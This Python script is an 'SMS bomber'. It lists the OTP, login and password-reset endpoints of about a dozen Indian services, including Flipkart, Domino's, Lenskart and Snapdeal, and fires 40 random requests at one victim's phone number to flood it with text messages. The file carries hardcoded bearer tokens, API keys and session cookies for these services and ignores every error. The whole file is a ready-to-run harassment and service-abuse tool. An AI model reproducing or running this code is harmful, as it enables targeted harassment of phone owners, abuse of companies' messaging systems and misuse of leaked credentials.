import requests
import time
import random


def main(num):
    bomb_urls = [
        {
            "url": "https://api.apollo247.com/graphql",
            "headers": {
                "accept": "*/*",
                "authorization": "Bearer 3d1833da7020e0602165529446587434",
                "Content-Type": "application/json",
                "Host": "api.apollo247.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.12.1",
                "Content-Length": "357",
            },
            "json": {
                "operationName": "Login",
                "variables": {
                    "mobileNumber": "+91" + str(num),
                    "loginType": "PATIENT",
                    "hashCode": "XZNKZ3TUKDO",
                },
                "query": "query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!, $hashCode: String) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType, hashCode: $hashCode) {\n    status\n    message\n    loginId\n    __typename\n  }\n}\n",
            },
        },
        {
            "url": "https://www.snapdeal.com/sendOTP?emailId=&mobileNumber="
            + str(num)
            + "&purpose=LOGIN_WITH_MOBILE_OTP",
        },
        {
            "url": "https://api.dominos.co.in/loginhandler/forgotpassword",
            "headers": {
                "Host": "api.dominos.co.in",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q\u003d0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/json",
                "Access-Control-Allow-Origin": "*",
                "Access-Control-Allow-Methods": "GET, POST, PATCH, PUT, DELETE, OPTIONS",
                "Access-Control-Allow-Headers": "*",
                "api_key": "X24EZOH3IL",
                "storeId": "67066",
                "isLoggedIn": "false",
                "client_type": "web-chrome",
                "source": "NewDesktop#brand",
                "deliveryType": "D",
                "X-Frame-Options": "mitigate",
                "X-content-Type-options": "nosniff",
                "Strict-Transport-Security": "max-age\u003d1639791215888",
                "Origin": "https://pizzaonline.dominos.co.in",
                "Connection": "keep-alive",
                "Referer": "https://pizzaonline.dominos.co.in/menu?src\u003dbrand",
                "AlexaToolbar-ALX_NS_PH": "AlexaToolbar/alx-4.0.2",
                "Content-Length": "52",
            },
            "json": {"lastName": "", "mobile": str(num), "firstName": ""},
        },
        {
            "url": "https://www.flipkart.com/api/5/user/otp/generate?loginId=%2B91"
            + str(num),
            "headers": {
                "host": "www.flipkart.com",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
                "accept": "*/*",
                "accept-language": "en-US,en;q\u003d0.5",
                "accept-encoding": "gzip, deflate, br",
                "referer": "https://www.flipkart.com/",
                "x-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop",
                "origin": "https://www.flipkart.com",
                "cookie": "SN\u003d2.VI42314DA933FB45329309CDA56128EEA9.SI55DE8D3CDF8A416B935AA8AD1E134D76.VS6FDB5059889A4974908D4328E3F28F0A.1630177877;Version\u003d1;Path\u003d/;Domain\u003dflipkart.com;Expires\u003dThu, 24-Feb-2022 19:11:17 GMT;Max-Age\u003d15552000;Secure;HttpOnly;SameSite\u003dNone",
                "connection": "keep-alive",
                "Content-Type": "application/x-www-form-urlencoded; charset\u003dutf-8",
                "Content-Length": "23",
            },
            "json": {
                "CACHE_INVALIDATION_TTL": "0",
                "META_INFO": {
                    "abContext": {"abWrapper": []},
                    "appConfigHash": None,
                    "clientConfigHashMap": None,
                    "dcInfo": None,
                    "omnitureInfo": None,
                },
                "REQUEST": None,
                "REQUEST-ID": "6364b771-4309-44ec-8a7b-674b2e083181",
                "RESPONSE": {
                    "emailMask": None,
                    "otpRegex": "([0-9]{6})",
                    "remainingAttempts": 4,
                    "requestId": "A584BA3135FD47FAA6FF4CF87D69B7B7C",
                    "smsServers": "FLPKRT,EKARTL,FLPKTM,FLIPCT",
                },
                "SESSION": {
                    "accountId": None,
                    "asn": None,
                    "email": None,
                    "firstName": None,
                    "flipkartFirstUser": False,
                    "isLoggedIn": False,
                    "lastName": None,
                    "nsid": "3.SI55DE8D3CDF8A416B935AA8AD1E134D76.1630177878175.VI0CB304EB77F24055A1EA906A11CDEB46",
                    "secureToken": "SI55DE8D3CDF8A416B935AA8AD1E134D76:VI0CB304EB77F24055A1EA906A11CDEB46",
                    "sn": "VI0CB304EB77F24055A1EA906A11CDEB46.TOKE18F1DE4E16346628325412494763115.1630177878.LO",
                    "ts": 0,
                    "twoFa": False,
                    "vid": "VI0CB304EB77F24055A1EA906A11CDEB46",
                },
                "STATUS_CODE": 200,
            },
        },
        {
            "url": "https://api.faasos.io/v1/otp_mobile.json",
            "headers": {
                "sec-ch-ua": '" Not;A Brand";v\u003d"99", "Google Chrome";v\u003d"91", "Chromium";v\u003d"91"',
                "sec-ch-ua-mobile": "?0",
                "Custom-Origin": "WebApp-OS-React",
                "Client-Source": "10",
                "Accept": "application/json, text/plain, */*",
                "Brand-Id": "10",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
                "Client-Os": "WebApp-Ovenstory",
                "Content-Type": "application/json;charset\u003dUTF-8",
                "Content-Length": "97",
                "Host": "api.faasos.io",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
            },
            "json": {
                "mobile": str(num),
                "clientSource": 10,
                "brand_id": 10,
                "dialing_code": "+91",
                "country_code": "IND",
            },
        },
        {
            "url": "https://api.lenskart.com/v2/customers/sendOtp",
            "headers": {
                "Host": "api.lenskart.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q\u003d0.5",
                "X-Api-Client": "desktop",
                "Cache-Control": "no-cache, no-store",
                "X-Session-Token": "2253d14f-7b11-41c1-b9a9-0bfc151c6ad6",
                "Origin": "https://www.lenskart.com",
                "Connection": "keep-alive",
                "Referer": "https://www.lenskart.com/",
                "Content-Type": "application/json; charset\u003dutf-8",
                "Content-Length": "26",
                "Accept-Encoding": "gzip",
            },
            "json": {"telephone": str(num)},
        },
        {
            "url": "https://web.okcredit.in/api/authn/v1.0/otp:request",
            "headers": {
                "sec-ch-ua": '" Not;A Brand";v\u003d"99", "Google Chrome";v\u003d"91", "Chromium";v\u003d"91"',
                "sec-ch-ua-mobile": "?0",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
                "Accept": "*/*",
                "Content-Type": "application/json; charset\u003dutf-8",
                "Content-Length": "32",
                "Host": "web.okcredit.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
            },
            "json": {"mobile": str(num), "mode": 0},
        },
        {
            "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
            "headers": {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            },
            "params": {"mobile": str(num)},
        },
        {
            "url": "https://grofers.com/v2/accounts/",
            "headers": {
                "auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            },
            "data": {"user_phone": str(num)},
        },
        {
            "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
            "data": {
                "firstName": "xxps",
                "login": "wiqpdl223@wqew.com",
                "password": "QASpw@1s",
                "genderType": "Male",
                "mobileNumber": str(num),
                "requestType": "SENDOTP",
            },
        },
        {
            "url": "https://api.nnnow.com/d/api/appDownloadLink",
            "headers": {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            },
            "data": {"mobileNumber": str(num)},
        },
    ]

    for _ in range(40):
        time.sleep(0.5)
        try:
            bomb = random.choice(bomb_urls)
            requests.post(**bomb)
        except:
            pass
    return
